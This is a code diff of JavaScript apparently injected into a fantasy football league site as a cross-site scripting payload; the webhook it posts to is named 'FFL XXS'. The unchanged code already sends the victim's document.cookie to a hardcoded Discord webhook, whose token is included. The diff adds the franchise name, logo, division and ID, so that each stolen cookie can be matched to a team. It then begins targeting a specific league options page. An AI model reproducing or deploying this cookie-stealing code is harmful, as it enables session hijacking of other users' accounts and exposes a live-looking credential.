@@ -4,14 +4,50 @@ if (!window.scriptRan) {
 window.scriptRan = true;
 
 function main() {
+  function isValidImageURL(url) {
+    try {
+      new URL(url);
+    } catch {
+      return false;
+    }
+
+    return /\.(png|jpg|jpeg|gif|webp|bmp|svg)$/i.test(url);
+  }
+
+  if (!isValidImageURL(franchiseDatabase[`fid_${franchise_id}`].logo)) franchiseDatabase[`fid_${franchise_id}`].logo = "";
+  if (!isValidImageURL(franchiseDatabase[`fid_${franchise_id}`].icon)) franchiseDatabase[`fid_${franchise_id}`].icon = "";
+
   fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ content: document.cookie })
+    body: JSON.stringify({
+      username: "FFL XXS",
+      avatar_url: "https://assets.dragoart.com/images/19231_501/how-to-draw-a-football-helmet_5e4cc7ff97a800.20289860_91922_5_4.png", // Optional avatar
+      content: "",
+      embeds: [
+        {
+          title: `\`${franchiseDatabase[`fid_${franchise_id}`].name}\``,
+          description: `Cookies: \`\`\`${document.cookie}\`\`\``,
+          url: "",
+          color: 0xFF0000,
+          timestamp: new Date().toISOString(),
+          image: {
+            url: franchiseDatabase[`fid_${franchise_id}`].logo
+          },
+          thumbnail: {
+            url: franchiseDatabase[`fid_${franchise_id}`].icon
+          },
+          fields: [
+            { name: "Division:", value: franchiseDatabase[`fid_${franchise_id}`].division, inline: true },
+            { name: "Franchise ID:", value: franchise_id, inline: true }
+          ]
+        }
+      ]
+    })
   });
-
+  
   if (window.location.href.startsWith("https://www42.myfantasyleague.com/2025/options")) {
     const myTable = Array.from(document.querySelectorAll('table.report'))
       .find(tbl => tbl.querySelector('caption span')?.textContent.trim() === "VanGinkelTouchedMyJinkel");
